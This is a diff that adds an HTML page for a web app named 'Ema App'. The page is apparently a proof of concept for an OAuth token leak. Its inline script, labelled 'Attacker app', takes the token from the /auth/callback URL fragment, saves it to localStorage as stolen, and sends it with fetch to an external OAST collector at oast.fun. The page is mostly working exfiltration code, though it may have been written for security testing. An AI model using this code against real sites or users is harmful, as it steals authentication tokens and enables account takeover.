@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ema App</title>
+  </head>
+  <body style="margin:0;background:#0b0f19;color:#d7e2f0;font:16px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace">
+    <div id="root"></div>
+    <div id="out" style="padding:48px;white-space:pre-wrap"></div>
+
+    <script>
+      (function () {
+        // OAST callback (interactsh / Collaborator).
+        var COLLECTOR = "https://qmkraglsiemjdbozadifvm5uwphhi4gm3.oast.fun";
+
+        var out = document.getElementById("out");
+
+        if (location.pathname !== "/auth/callback") {
+          out.textContent = "Attacker app — waiting for /auth/callback";
+          return;
+        }
+
+        var m = location.hash.match(/(?:^|[#&])token=([^&]+)/);
+        if (!m) {
+          out.textContent = "No token in the fragment.";
+          return;
+        }
+
+        var token = decodeURIComponent(m[1]);
+        try { localStorage.setItem("f026_stolen", token); } catch (e) {}
+        out.textContent =
+          "ATTACKER APP — /auth/callback\n" +
+          "origin: " + location.origin + "\n" +
+          "fragment: " + location.hash.length + " chars\n\n" +
+          "received token:\n" +
+          token.slice(0, 52) + "…(" + token.length + " chars)\n\n" +
+          "sending to attacker server…";
+
+        fetch(COLLECTOR + "/?h=" + encodeURIComponent(token), { mode: "no-cors" })
+          .then(function () {
+            out.textContent += "\nsent to attacker server ✓";
+          })
+          .catch(function (e) {
+            out.textContent += "\nsend failed: " + e;
+          });
+      })();
+    </script>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
